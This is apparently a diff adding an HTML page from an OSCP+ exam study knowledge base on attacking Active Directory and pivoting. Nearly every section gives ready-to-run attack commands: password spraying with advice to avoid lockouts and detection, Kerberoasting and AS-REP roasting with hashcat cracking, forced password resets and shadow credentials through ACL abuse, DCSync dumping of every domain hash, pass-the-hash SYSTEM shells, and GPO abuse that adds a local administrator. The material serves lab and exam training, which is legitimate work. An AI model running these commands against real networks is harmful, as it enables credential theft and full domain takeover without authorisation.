@@ -1,0 +1,416 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Active Directory &amp; Pivot · OSCP+ KB</title>
+<style>
+:root{
+  --bg:#0d1117; --bg2:#0a0d12; --panel:#11161d; --panel2:#161c24; --hover:#1b2531;
+  --text:#c9d3de; --head:#e8eef5; --muted:#7d8794; --faint:#5a6472;
+  --accent:#4f9cf9; --accent-soft:#1a2942; --accent2:#e3a008;
+  --border:#20262e; --border2:#2a323c;
+  --code-bg:#0a0e13; --code-text:#c9d3de;
+  --tag-bg:#0f2a1c; --tag-text:#56d364; --tag-bd:#1c3f2a;
+  --hl:#7a5c00; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(0,0,0,.4);
+}
+html[data-theme="light"]{
+  --bg:#ffffff; --bg2:#f6f8fa; --panel:#f6f8fa; --panel2:#eef1f4; --hover:#e7ecf1;
+  --text:#24292f; --head:#0f1419; --muted:#57606a; --faint:#8b949e;
+  --accent:#0969da; --accent-soft:#ddf0ff; --accent2:#9a6700;
+  --border:#d8dee4; --border2:#cdd5dd;
+  --code-bg:#f2f4f7; --code-text:#24292f;
+  --tag-bg:#e6f7ec; --tag-text:#1a7f37; --tag-bd:#c3ead0;
+  --hl:#fff3b0; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(140,149,159,.25);
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--text);
+  font:15.5px/1.68 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  -webkit-font-smoothing:antialiased;}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+::selection{background:var(--accent-soft)}
+
+#layout{display:flex;min-height:100vh}
+
+/* ---------- Sidebar ---------- */
+#sidebar{width:300px;flex:0 0 300px;background:var(--panel);border-right:1px solid var(--border);
+  height:100vh;position:sticky;top:0;display:flex;flex-direction:column}
+#brand{padding:18px 18px 12px}
+#brand .logo{font-size:15px;font-weight:700;color:var(--head);letter-spacing:.2px;display:flex;align-items:center;gap:8px}
+#brand .tagline{color:var(--faint);font-size:11.5px;margin-top:3px;letter-spacing:.3px}
+#navfilterwrap{padding:0 14px 12px;border-bottom:1px solid var(--border)}
+#navfilter{width:100%;padding:9px 12px;background:var(--bg2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:13px;outline:none}
+#navfilter:focus{border-color:var(--accent)}
+#navtools{display:flex;gap:6px;padding:10px 14px 4px}
+#navtools button{flex:1;background:none;border:1px solid var(--border2);color:var(--muted);
+  border-radius:7px;padding:5px 6px;cursor:pointer;font-size:11px}
+#navtools button:hover{color:var(--text);border-color:var(--accent)}
+#nav{overflow-y:auto;padding:6px 8px 60px;flex:1}
+#nav::-webkit-scrollbar{width:9px}#nav::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+.navgroup{margin-bottom:1px}
+.navvol{width:100%;text-align:left;background:none;border:none;color:var(--head);
+  font-weight:600;font-size:12.5px;padding:8px 8px;cursor:pointer;border-radius:7px;
+  display:flex;gap:7px;align-items:center;line-height:1.35}
+.navvol:hover{background:var(--hover)}
+.navvol .tw{color:var(--faint);font-size:10px;transition:transform .15s;flex:0 0 10px}
+.navgroup.collapsed .tw{transform:rotate(-90deg)}
+.navgroup.collapsed .navitems{display:none}
+.navitems{display:flex;flex-direction:column;padding:1px 0 8px 3px;margin-left:8px;
+  border-left:1px solid var(--border)}
+.navlink{color:var(--muted);font-size:12px;padding:4px 10px;border-radius:6px;white-space:nowrap;
+  overflow:hidden;text-overflow:ellipsis;border-left:2px solid transparent;margin-left:-1px}
+.navlink:hover{background:var(--hover);color:var(--text);text-decoration:none}
+.navlink.lvl1{color:var(--head);font-weight:700;margin-top:11px;font-size:12.5px}
+.navlink.lvl1:first-child{margin-top:2px}
+.navlink.lvl2{padding-left:22px;font-size:11.5px;color:var(--muted);border-left:1px solid var(--border)}
+.navlink.lvl2:hover,.navlink.lvl2.active{border-left-color:var(--accent)}
+.navlink.active{background:var(--accent-soft);color:var(--accent);border-left-color:var(--accent)}
+
+/* ---------- Main ---------- */
+#main{flex:1;min-width:0;display:flex;flex-direction:column;background:var(--bg)}
+#topbar{position:sticky;top:0;z-index:20;background:color-mix(in srgb,var(--bg) 88%,transparent);
+  backdrop-filter:saturate(1.4) blur(8px);border-bottom:1px solid var(--border);
+  padding:11px 26px;display:flex;gap:12px;align-items:center}
+#searchwrap{position:relative;flex:1;max-width:620px}
+#searchwrap .ic{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--faint);font-size:14px}
+#search{width:100%;padding:9px 12px 9px 34px;background:var(--panel2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:14px;outline:none}
+#search:focus{border-color:var(--accent);background:var(--bg2)}
+#count{color:var(--muted);font-size:12px;min-width:64px;text-align:right;font-variant-numeric:tabular-nums}
+.iconbtn{background:var(--panel2);color:var(--muted);border:1px solid var(--border2);
+  border-radius:9px;width:38px;height:38px;cursor:pointer;font-size:15px;display:inline-flex;
+  align-items:center;justify-content:center}
+.iconbtn:hover{color:var(--text);border-color:var(--accent)}
+
+#content{padding:34px 44px 140px;max-width:860px;margin:0 auto;width:100%}
+#content h1{font-size:23px;font-weight:700;color:var(--head);letter-spacing:-.2px;
+  margin:8px 0 18px;padding-bottom:12px;border-bottom:1px solid var(--border);line-height:1.3}
+.vol + .vol h1, #content h1.volstart{margin-top:56px}
+.volkicker{font-size:10.5px;font-weight:700;letter-spacing:1.4px;color:var(--faint);text-transform:uppercase;
+  margin:58px 0 4px;padding-top:22px;border-top:1px solid var(--border)}
+.vol:first-child .volkicker{margin-top:4px;border-top:none;padding-top:0}
+#content h2{font-size:18px;font-weight:650;color:var(--head);margin:34px 0 10px;
+  padding-left:11px;border-left:3px solid var(--accent);line-height:1.35}
+#content h3{font-size:15px;font-weight:650;color:var(--accent2);margin:24px 0 8px}
+#content h4{font-size:13.5px;font-weight:650;color:var(--head);margin:16px 0 6px;
+  text-transform:uppercase;letter-spacing:.4px}
+.vol{scroll-margin-top:66px}
+#content h1,#content h2,#content h3,#content h4{scroll-margin-top:70px;position:relative}
+.anchor{opacity:0;margin-left:8px;color:var(--faint);font-weight:400;font-size:.75em}
+h1:hover .anchor,h2:hover .anchor,h3:hover .anchor{opacity:1}
+#content p{margin:9px 0}
+#content ul,#content ol{margin:9px 0;padding-left:24px}
+#content li{margin:4px 0}
+#content li::marker{color:var(--faint)}
+
+/* inline code + tag pills */
+code{background:var(--code-bg);color:var(--code-text);padding:1px 5px;border-radius:5px;
+  font:12.5px/1.45 "SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
+  border:1px solid var(--border);white-space:nowrap}
+code.tag{background:var(--tag-bg);color:var(--tag-text);border:1px solid var(--tag-bd);
+  font-weight:600;letter-spacing:.2px;cursor:pointer}
+code.tag:hover{filter:brightness(1.15)}
+
+pre{background:var(--code-bg);border:1px solid var(--border);border-radius:11px;padding:14px 16px;
+  overflow:auto;margin:14px 0;box-shadow:var(--shadow)}
+pre code{background:none;border:none;padding:0;color:var(--code-text);white-space:pre;
+  font-size:12.5px;line-height:1.55}
+pre::-webkit-scrollbar{height:9px}pre::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+
+blockquote{border-left:3px solid var(--accent2);background:var(--panel);margin:14px 0;
+  padding:11px 16px;border-radius:0 9px 9px 0;color:var(--muted);font-size:14.5px}
+blockquote strong{color:var(--head)}
+
+.tablewrap{overflow-x:auto;margin:14px 0;border:1px solid var(--border);border-radius:10px;box-shadow:var(--shadow)}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border-bottom:1px solid var(--border);border-right:1px solid var(--border);padding:8px 12px;text-align:left;vertical-align:top}
+tr td:last-child,tr th:last-child{border-right:none}
+tbody tr:last-child td{border-bottom:none}
+th{background:var(--panel2);font-weight:650;color:var(--head)}
+tbody tr:nth-child(even){background:var(--bg2)}
+tbody tr:hover{background:var(--hover)}
+
+hr{border:none;border-top:1px solid var(--border);margin:30px 0}
+mark{background:var(--hl);color:var(--head);padding:0 1px;border-radius:2px}
+mark.current{background:var(--hl-cur);color:#111;box-shadow:0 0 0 2px var(--hl-cur)}
+
+#totop{position:fixed;right:26px;bottom:26px;z-index:30;background:var(--accent);color:#fff;border:none;
+  width:42px;height:42px;border-radius:11px;font-size:17px;cursor:pointer;display:none;box-shadow:0 6px 18px rgba(0,0,0,.45)}
+#menuBtn{display:none}
+
+@media(max-width:900px){
+  #sidebar{position:fixed;z-index:50;left:-320px;transition:left .2s;box-shadow:6px 0 24px rgba(0,0,0,.5)}
+  #sidebar.open{left:0}
+  #menuBtn{display:inline-flex}
+  #content{padding:20px 18px 120px}
+  #topbar{padding:10px 14px}
+}
+</style>
+</head>
+<body>
+<div id="layout">
+  <aside id="sidebar">
+    <div id="brand">
+      <a href="index.html" style="text-decoration:none"><div class="logo">🏰 Active Directory &amp; Pivot</div></a>
+      <a href="index.html" class="tagline" style="display:inline-block;margin-top:4px">← all sections</a>
+    </div>
+    <div id="navfilterwrap"><input id="navfilter" placeholder="Filter this section…"></div>
+    <nav id="nav"><div class="navitems"><a class="navlink lvl1" href="#v7-[ad-quick]-the-core-ad-commands-one-screen">[AD-QUICK]  the core AD commands  (one screen)</a><a class="navlink lvl1" href="#v7-[ad-enum]-enumerating-the-domain">[AD-ENUM]  enumerating the domain</a><a class="navlink lvl2" href="#v7-[ad-user]-building-a-username-list-the-password-policy">[AD-USER]  building a username list + the password policy</a><a class="navlink lvl2" href="#v7-[ad-sid]-security-identifiers-sids-the-id-number-behind-every-account">[AD-SID]  Security Identifiers (SIDs) — the ID number behind every account</a><a class="navlink lvl2" href="#v7-[ad-credentials]-getting-your-first-or-next-credential">[AD-CREDENTIALS]  getting your first (or next) credential</a><a class="navlink lvl2" href="#v7-[ad-kerberoast]-kerberoasting-[think-spn]">[AD-KERBEROAST]  Kerberoasting  → [THINK-SPN]</a><a class="navlink lvl2" href="#v7-[ad-asrep]-as-rep-roasting">[AD-ASREP]  AS-REP roasting</a><a class="navlink lvl2" href="#v7-[ad-acl]-abusing-object-permissions-bloodhound-edges-the-ad-mid-game">[AD-ACL]  abusing object permissions (BloodHound &quot;edges&quot;) — the AD mid-game</a><a class="navlink lvl2" href="#v7-[ad-dcsync]-domain-takeover-steal-every-password-hash">[AD-DCSYNC]  domain takeover — steal every password hash</a><a class="navlink lvl2" href="#v7-[ad-lateral]-moving-to-another-machine-with-a-working-credentialhash">[AD-LATERAL]  moving to another machine (with a working credential/hash)</a><a class="navlink lvl2" href="#v7-[ad-gpo]-abusing-group-policy-system-on-every-linked-machine-even-the-dc">[AD-GPO]  abusing Group Policy → SYSTEM on every linked machine (even the DC)</a><a class="navlink lvl2" href="#v7-[ad-delegation]-kerberos-delegation-recognise-basic-abuse">[AD-DELEGATION]  Kerberos delegation (recognise + basic abuse)</a><a class="navlink lvl2" href="#v7-[ad-bloodhound]-the-map-that-finds-your-path-[think-domainuser]">[AD-BLOODHOUND]  the map that finds your path  → [THINK-DOMAINUSER]</a><a class="navlink lvl2" href="#v7-[ad-attack-path]-how-a-typical-exam-chain-looks">[AD-ATTACK-PATH]  how a typical exam chain looks</a><a class="navlink lvl2" href="#v7-[kerberos-quick]-kerberos-cheat-strip">[KERBEROS-QUICK]  Kerberos cheat-strip</a><a class="navlink lvl2" href="#v7-[ad-troubleshooting]">[AD-TROUBLESHOOTING]</a><a class="navlink lvl1" href="#v7-[pivot]-pivoting-reaching-networks-only-the-victim-can-see">[PIVOT]  PIVOTING — reaching networks only the victim can see</a><a class="navlink lvl2" href="#v7-[pivot-quick]-the-two-tools-you-need-one-screen">[PIVOT-QUICK]  the two tools you need  (one screen)</a><a class="navlink lvl2" href="#v7-[pivot-ssh]-ssh-port-forwarding-get-the-direction-right">[PIVOT-SSH]  SSH port forwarding (get the direction right)</a><a class="navlink lvl2" href="#v7-[pivot-chisel]-details">[PIVOT-CHISEL]  details</a><a class="navlink lvl2" href="#v7-[pivot-ligolo]-details-preferred">[PIVOT-LIGOLO]  details (preferred)</a><a class="navlink lvl2" href="#v7-[pivot-enum]-what-to-do-after-you-pivot">[PIVOT-ENUM]  what to do after you pivot</a><a class="navlink lvl2" href="#v7-[pivot-troubleshooting]">[PIVOT-TROUBLESHOOTING]</a></div></nav>
+  </aside>
+  <div id="main">
+    <div id="topbar">
+      <button id="menuBtn" class="iconbtn" onclick="document.getElementById('sidebar').classList.toggle('open')">☰</button>
+      <a class="iconbtn" href="index.html" title="All sections">≡</a>
+      <div id="searchwrap"><span class="ic">🔎</span><input id="search" placeholder="Search this section…   Enter ↵ next"></div>
+      <span id="count"></span>
+      <button class="iconbtn" onclick="clearSearch()" title="Clear">✕</button>
+      <button class="iconbtn" onclick="toggleTheme()" title="Theme">◐</button>
+    </div>
+    <main id="content"><section class="vol"><div class="volkicker" id="v7-oscp-knowledge-base-volume-5">OSCP+ KNOWLEDGE BASE — VOLUME 5</div>
+<h2 id="v7-active-directory-breaking-a-windows-domain-pivoting">ACTIVE DIRECTORY (breaking a Windows domain) + PIVOTING<a class="anchor" href="#v7-active-directory-breaking-a-windows-domain-pivoting">#</a></h2>
+<blockquote><strong>Read this box first — it&#x27;s the most important 40 points on the exam.</strong>  <strong>What is Active Directory (AD)?</strong> In companies, Windows computers and users aren&#x27;t managed one-by-one — they&#x27;re joined into a <strong>domain</strong> run by a central server called the <strong>Domain Controller (DC)</strong>. The DC holds every user, password, group, and computer. <strong>Own the DC and you own everything.</strong> The exam&#x27;s AD set is 3 chained machines worth 40 points, all-or-nothing.  <strong>&quot;Assumed breach&quot;:</strong> the exam hands you one low-privilege domain username+password to start (you don&#x27;t have to find the first foothold). Your job: use that to enumerate the domain, steal more credentials, hop from machine to machine, and eventually take over the DC.  <strong>Placeholders:</strong> <code>$DC</code> = the Domain Controller&#x27;s IP · <code>$DOMAIN</code> = the domain name (like <code>corp.local</code>) · <code>$U</code>/<code>$P</code> = a username/password you have · <code>$H</code> = an NTLM password hash · <code>&lt;IP&gt;</code> = your Kali IP.  <strong>⏰ Always fix the clock first for Kerberos.</strong> AD&#x27;s login system (Kerberos) refuses if your clock differs from the DC&#x27;s by more than 5 minutes. Symptom: <code>KRB_AP_ERR_SKEW</code>. Fix: <code>sudo ntpdate $DC</code> (or <code>sudo rdate -n $DC</code>).  <strong>The whole AD game in one loop:</strong> enumerate → map with BloodHound → get a credential → see what it unlocks → move to the next machine → repeat → reach the DC.</blockquote>
+<hr>
+<h1 id="v7-[ad-quick]-the-core-ad-commands-one-screen">[AD-QUICK]  the core AD commands  (one screen)<a class="anchor" href="#v7-[ad-quick]-the-core-ad-commands-one-screen">#</a></h1>
+<pre><code># 1) Test a credential and see WHERE it&#x27;s admin (&quot;Pwn3d!&quot; = local admin on that host):
+nxc smb &lt;hosts&gt; -u $U -p $P
+# 2) Dump users/groups/policy/shares from the DC:
+nxc smb $DC -u $U -p $P --users --groups --pass-pol --shares
+# 3) Collect the whole domain map for BloodHound (do this EARLY):
+bloodhound-python -u $U -p $P -d $DOMAIN -ns $DC -c all --zip
+# 4) The two &quot;free&quot; credential attacks (see below):
+impacket-GetNPUsers  $DOMAIN/ -dc-ip $DC -no-pass -usersfile users.txt   # AS-REP roast (needs NO password)
+impacket-GetUserSPNs -request $DOMAIN/$U:$P -dc-ip $DC                     # Kerberoast (needs any one password)
+# 5) Spray a working cred across the whole subnet, then log in where you&#x27;re admin:
+nxc smb &lt;subnet&gt; -u $U -p $P --continue-on-success
+evil-winrm -i &lt;host&gt; -u $U -p $P            # get a shell (WinRM), OR:
+impacket-psexec $DOMAIN/$U:$P@&lt;host&gt;        # get a SYSTEM shell (SMB)</code></pre>
+<hr>
+<h1 id="v7-[ad-enum]-enumerating-the-domain">[AD-ENUM]  enumerating the domain<a class="anchor" href="#v7-[ad-enum]-enumerating-the-domain">#</a></h1>
+<p><strong>What you need:</strong> network reach to the DC, and ideally one domain credential (the exam gives you one).</p>
+<p><strong>Confirm it&#x27;s a domain:</strong> ports 88/389/445/135 open; <code>nxc smb $DC</code> prints the domain + hostname.</p>
+<p><strong>Commands (with a credential):</strong></p>
+<pre><code>nxc smb  $DC -u $U -p $P --users                 # list every domain user
+nxc smb  $DC -u $U -p $P --groups --pass-pol --shares   # groups (find the admins) + lockout policy + shares
+nxc ldap $DC -u $U -p $P --users --groups        # same via LDAP — also shows &#x27;description&#x27; fields (passwords hide there!)
+ldapdomaindump -u &quot;$DOMAIN\\$U&quot; -p $P $DC -o ldd/  # dump everything to browsable HTML/JSON files
+# with NO credential — pull usernames by cycling ID numbers:
+nxc smb $DC -u &#x27;&#x27; -p &#x27;&#x27; --rid-brute
+impacket-lookupsid $DOMAIN/$U:$P@$DC              # the domain&#x27;s SID + every account:RID
+# find attackable accounts in one shot:
+nxc ldap $DC -u $U -p $P --kerberoasting kr.txt --asreproast ar.txt --trusted-for-delegation</code></pre>
+<p><strong>What in the output matters:</strong> the <strong>user list</strong> (→ spray/roast), the <strong>computer list</strong>, <strong>group memberships</strong> (who are the admins?), the <strong>password policy</strong> (the lockout threshold tells you how safely you can spray), accounts with <strong>SPNs</strong> (Kerberoastable), accounts that <strong>&quot;do not require pre-auth&quot;</strong> (AS-REP roastable), and any **<code>description</code>** fields (admins hide passwords there).</p>
+<p><strong>Next:</strong> run BloodHound, do the roasts, spray your cred.</p>
+<h2 id="v7-[ad-user]-building-a-username-list-the-password-policy">[AD-USER]  building a username list + the password policy<a class="anchor" href="#v7-[ad-user]-building-a-username-list-the-password-policy">#</a></h2>
+<ul>
+<li><strong>Build a user list</strong> from: LDAP/RID cycling, <code>enum4linux-ng</code>, SMTP enumeration, Kerbrute (<code>kerbrute userenum -d $DOMAIN --dc $DC users.txt</code>), the website, or files in shares. Common name formats: <code>first.last</code>, <code>flast</code>, <code>f.last</code>.</li>
+<li><strong>Check the password policy:</strong> <code>nxc smb $DC -u $U -p $P --pass-pol</code>. The <strong>lockout threshold</strong> is how many wrong guesses lock an account. Spray *fewer* than that per time-window, then wait for the reset — or you&#x27;ll lock people out and tip off the defender.</li>
+</ul>
+<h2 id="v7-[ad-sid]-security-identifiers-sids-the-id-number-behind-every-account">[AD-SID]  Security Identifiers (SIDs) — the ID number behind every account<a class="anchor" href="#v7-[ad-sid]-security-identifiers-sids-the-id-number-behind-every-account">#</a></h2>
+<p><strong>What it is:</strong> every user/group/computer in AD has a unique ID called a SID, like <code>S-1-5-21-3623811015-3361044348-30300820-1013</code>. The long middle part is the <strong>domain&#x27;s</strong> ID; the <strong>last number (the &quot;RID&quot;)</strong> identifies the specific account.</p>
+<p><strong>RIDs worth knowing</strong> (the last number):</p>
+<pre><code>500 = Administrator   501 = Guest   502 = krbtgt (the Kerberos master account)
+512 = Domain Admins   513 = Domain Users   519 = Enterprise Admins   544 = local Administrators</code></pre>
+<p><strong>Why you care:</strong> the <strong>domain SID</strong> (everything before the last number) is needed to forge &quot;Golden Tickets&quot; (<code class="tag">[KERBEROS-QUICK]</code>). Get it with <code>impacket-lookupsid</code>. On a shell: <code>whoami /user</code>. An RID ≥ 1000 = a normal created account; &lt; 1000 = a built-in one.</p>
+<h2 id="v7-[ad-credentials]-getting-your-first-or-next-credential">[AD-CREDENTIALS]  getting your first (or next) credential<a class="anchor" href="#v7-[ad-credentials]-getting-your-first-or-next-credential">#</a></h2>
+<p>In rough order of ease: <strong>AS-REP roast (no creds needed) → spray weak/reused passwords → Kerberoast (needs any cred) → loot shares (GPP passwords, scripts, configs) → dump hashes from a machine you own → abuse an ACL &quot;edge&quot;.</strong></p>
+<h2 id="v7-[ad-kerberoast]-kerberoasting-[think-spn]">[AD-KERBEROAST]  Kerberoasting  → <code class="tag">[THINK-SPN]</code><a class="anchor" href="#v7-[ad-kerberoast]-kerberoasting-[think-spn]">#</a></h2>
+<p><strong>What it is:</strong> &quot;service accounts&quot; in AD have something called an SPN. <strong>Any</strong> valid domain user can ask the DC for a ticket for a service account — and that ticket is encrypted with the service account&#x27;s password. You crack it offline to recover the password. Service accounts are often powerful.</p>
+<p><strong>You need:</strong> just one domain credential.</p>
+<pre><code>impacket-GetUserSPNs -request $DOMAIN/$U:$P -dc-ip $DC -outputfile tgs.txt   # request the tickets → hashes into tgs.txt
+hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule   # crack (13100 = Kerberoast)</code></pre>
+<p><strong>You get:</strong> the service account&#x27;s cleartext password (if it&#x27;s weak). <strong>Next:</strong> spray it everywhere; check that account in BloodHound (often an admin).</p>
+<p><strong>Troubleshoot:</strong> clock skew → <code>ntpdate $DC</code>; no SPN accounts → nothing to roast; won&#x27;t crack → strong password, move on. <strong>Targeted Kerberoast:</strong> if you have <code>GenericWrite</code> on a user, you can *set* an SPN on them, roast, then remove it <code class="tag">[LOOK-UP]</code>.</p>
+<h2 id="v7-[ad-asrep]-as-rep-roasting">[AD-ASREP]  AS-REP roasting<a class="anchor" href="#v7-[ad-asrep]-as-rep-roasting">#</a></h2>
+<p><strong>What it is:</strong> some accounts are misconfigured with &quot;Kerberos pre-authentication&quot; turned off. For those, <strong>anyone</strong> — no password needed — can request a chunk of data encrypted with the user&#x27;s password, then crack it offline.</p>
+<p><strong>You need:</strong> just a list of usernames.</p>
+<pre><code>impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC -format hashcat -outputfile asrep.txt
+hashcat -m 18200 asrep.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule    # crack (18200 = AS-REP)</code></pre>
+<p><strong>You get:</strong> the cleartext of any weak-password account. <strong>Next:</strong> spray it + look that user up in BloodHound.</p>
+<h2 id="v7-[ad-acl]-abusing-object-permissions-bloodhound-edges-the-ad-mid-game">[AD-ACL]  abusing object permissions (BloodHound &quot;edges&quot;) — the AD mid-game<a class="anchor" href="#v7-[ad-acl]-abusing-object-permissions-bloodhound-edges-the-ad-mid-game">#</a></h2>
+<p><strong>What it is:</strong> AD lets one account hold special rights over another (reset their password, add them to a group, etc.). If you control an account that has a dangerous right over a more powerful account, you take that account over — then repeat, climbing toward Domain Admin. <strong>BloodHound draws these as arrows (&quot;edges&quot;).</strong> Here&#x27;s what each edge means and how to abuse it:</p>
+<div class="tablewrap"><table><thead><tr><th>Edge (BloodHound name)</th><th>What it means</th><th>How to abuse it</th></tr></thead><tbody>
+<tr><td><strong>GenericAll</strong> (on a user)</td><td>total control of that user</td><td>force-change their password, then log in as them</td></tr>
+<tr><td><strong>GenericAll</strong> (on a computer)</td><td>total control of that computer</td><td>RBCD or &quot;shadow credentials&quot; → authenticate as it</td></tr>
+<tr><td><strong>GenericAll / Owns</strong> (on a group)</td><td>control the group</td><td>add yourself to the group</td></tr>
+<tr><td><strong>ForceChangePassword</strong></td><td>reset their password without the old one</td><td>set a new password, log in as them</td></tr>
+<tr><td><strong>GenericWrite / WriteProperty</strong> (user)</td><td>edit their attributes</td><td>set an SPN → targeted Kerberoast</td></tr>
+<tr><td><strong>WriteDACL</strong></td><td>rewrite the permissions list</td><td>grant yourself GenericAll, then abuse it</td></tr>
+<tr><td><strong>WriteOwner</strong></td><td>become the owner</td><td>set owner=you → grant GenericAll → abuse</td></tr>
+<tr><td><strong>AddMember / AddSelf</strong></td><td>add members to a group</td><td>add yourself to a privileged group</td></tr>
+<tr><td><strong>AllExtendedRights</strong> (on domain)</td><td>includes DCSync</td><td>DCSync the whole domain</td></tr>
+<tr><td><strong>AddKeyCredentialLink</strong></td><td>write a key credential</td><td>&quot;Shadow Credentials&quot; → get the account&#x27;s NT hash</td></tr>
+</tbody></table></div>
+<p><strong>Commands (run these from Kali):</strong></p>
+<pre><code># force-change a user&#x27;s password (GenericAll / ForceChangePassword):
+net rpc password &quot;targetuser&quot; &quot;NewP@ss1&quot; -U &quot;$DOMAIN&quot;/&quot;$U&quot;%&quot;$P&quot; -S $DC
+bloodyAD -u $U -p $P -d $DOMAIN --host $DC set password targetuser &#x27;NewP@ss1&#x27;
+# add yourself to a group (GenericAll / AddMember on the group):
+bloodyAD -u $U -p $P -d $DOMAIN --host $DC add groupMember &quot;Target Group&quot; $U
+# WriteOwner → make yourself owner → grant yourself full control (a chain):
+owneredit.py -action write -new-owner $U -target targetuser &quot;$DOMAIN&quot;/&quot;$U&quot;:&quot;$P&quot;
+dacledit.py  -action write -rights FullControl -principal $U -target targetuser &quot;$DOMAIN&quot;/&quot;$U&quot;:&quot;$P&quot;
+# Shadow Credentials (AddKeyCredentialLink) → get an NT hash:
+certipy shadow auto -u $U@$DOMAIN -p $P -account targetuser</code></pre>
+<p><strong>You get:</strong> control of the target account (its new password, hash, or ticket) → repeat up the graph.</p>
+<p><strong>Troubleshoot:</strong> password-complexity rules on force-change; clock skew for the certificate-based ones.</p>
+<h2 id="v7-[ad-dcsync]-domain-takeover-steal-every-password-hash">[AD-DCSYNC]  domain takeover — steal every password hash<a class="anchor" href="#v7-[ad-dcsync]-domain-takeover-steal-every-password-hash">#</a></h2>
+<p><strong>What it is:</strong> Domain Controllers replicate their database to each other. If your account has the &quot;replication&quot; right (Domain Admins have it, and BloodHound flags anyone else who does as &quot;DCSync&quot;), you can *pretend to be a DC* and ask for <strong>all</strong> password hashes — including the built-in Administrator and the <code>krbtgt</code> master key.</p>
+<pre><code>impacket-secretsdump $DOMAIN/$U:$P@$DC                          # dump ALL hashes (needs replication rights)
+impacket-secretsdump -just-dc-user krbtgt $DOMAIN/$U:$P@$DC     # just krbtgt (→ Golden Ticket)</code></pre>
+<p><strong>You get:</strong> the Administrator&#x27;s NTLM hash (→ Pass-the-Hash into the DC), the <code>krbtgt</code> hash (→ forge Golden Tickets), and every user&#x27;s hash. <strong>This is game over.</strong></p>
+<h2 id="v7-[ad-lateral]-moving-to-another-machine-with-a-working-credentialhash">[AD-LATERAL]  moving to another machine (with a working credential/hash)<a class="anchor" href="#v7-[ad-lateral]-moving-to-another-machine-with-a-working-credentialhash">#</a></h2>
+<p><strong>You need:</strong> creds/hash that are <strong>local admin</strong> on the target (<code>nxc smb &lt;host&gt; -u.. -p..</code> shows <code>(Pwn3d!)</code>).</p>
+<pre><code>evil-winrm -i &lt;host&gt; -u $U -p $P                 # interactive shell over WinRM (if the account has WinRM rights)
+evil-winrm -i &lt;host&gt; -u $U -H $H                 # same, but using a hash (Pass-the-Hash)
+impacket-psexec  $DOMAIN/$U:$P@&lt;host&gt;            # SYSTEM shell over SMB (reliable but &quot;loud&quot;)
+impacket-wmiexec $DOMAIN/$U:$P@&lt;host&gt;            # quieter command execution
+nxc smb &lt;host&gt; -u $U -p $P -x &quot;whoami&quot;           # run one quick command
+nxc smb &lt;host&gt; -u $U -H $H --sam --lsa           # dump that host&#x27;s stored creds</code></pre>
+<blockquote><strong>Pass-the-Hash (PtH):</strong> log in with the NTLM *hash* instead of the password — <code>-hashes :$H</code> (impacket) or <code>-H $H</code> (nxc/evil-winrm). You often never need to crack it.</blockquote>
+<p><strong>On each new host:</strong> loot its creds (secretsdump / LSASS) → new creds → repeat toward the DC.</p>
+<h2 id="v7-[ad-gpo]-abusing-group-policy-system-on-every-linked-machine-even-the-dc">[AD-GPO]  abusing Group Policy → SYSTEM on every linked machine (even the DC)<a class="anchor" href="#v7-[ad-gpo]-abusing-group-policy-system-on-every-linked-machine-even-the-dc">#</a></h2>
+<p><strong>What it is:</strong> Group Policy Objects (GPOs) push settings and scripts to groups of machines. If you have <strong>write access to a GPO</strong> (a BloodHound edge onto a GPO object), you can make it run a task as <strong>SYSTEM</strong> on every machine the GPO applies to — and if it&#x27;s linked to the DC, that&#x27;s domain compromise.</p>
+<pre><code># Windows (SharpGPOAbuse) — add yourself as a local admin on the affected machines:
+SharpGPOAbuse.exe --AddLocalAdmin --UserAccount &lt;you&gt; --GPOName &quot;&lt;GPO Name&gt;&quot;
+# Linux (pyGPOAbuse):
+pygpoabuse &#x27;&lt;DOMAIN&gt;/&lt;user&gt;:&lt;pass&gt;&#x27; -gpo-id &lt;GUID&gt; -command &#x27;net localgroup administrators &lt;you&gt; /add&#x27;
+gpupdate /force     # trigger it now (or wait ~90 min for the automatic refresh)</code></pre>
+<p><strong>You get:</strong> SYSTEM / local admin on the linked machines → then DCSync (<code class="tag">[AD-DCSYNC]</code>) → domain compromise.</p>
+<p><strong>Troubleshoot:</strong> the GPO must be *linked* to an OU containing your target (an unlinked GPO does nothing).</p>
+<h2 id="v7-[ad-delegation]-kerberos-delegation-recognise-basic-abuse">[AD-DELEGATION]  Kerberos delegation (recognise + basic abuse)<a class="anchor" href="#v7-[ad-delegation]-kerberos-delegation-recognise-basic-abuse">#</a></h2>
+<ul>
+<li><strong>Unconstrained delegation:</strong> if you take over such a host, you can trick a DC/admin into authenticating to it and capture their ticket → impersonate them <code class="tag">[LOOK-UP]</code>.</li>
+<li><strong>Constrained delegation:</strong> <code>getST.py -impersonate administrator ...</code> → impersonate any user to the allowed service.</li>
+<li><strong>RBCD (Resource-Based Constrained Delegation):</strong> if you can write to a computer object, add a machine account you control as &quot;allowed to act&quot;, then impersonate → local admin on that computer <code class="tag">[LOOK-UP]</code>.</li>
+</ul>
+<h2 id="v7-[ad-bloodhound]-the-map-that-finds-your-path-[think-domainuser]">[AD-BLOODHOUND]  the map that finds your path  → <code class="tag">[THINK-DOMAINUSER]</code><a class="anchor" href="#v7-[ad-bloodhound]-the-map-that-finds-your-path-[think-domainuser]">#</a></h2>
+<p><strong>What it is:</strong> BloodHound collects all the users, groups, computers, and permissions, then draws a graph so you can see the <strong>shortest path to Domain Admin</strong> instead of guessing.</p>
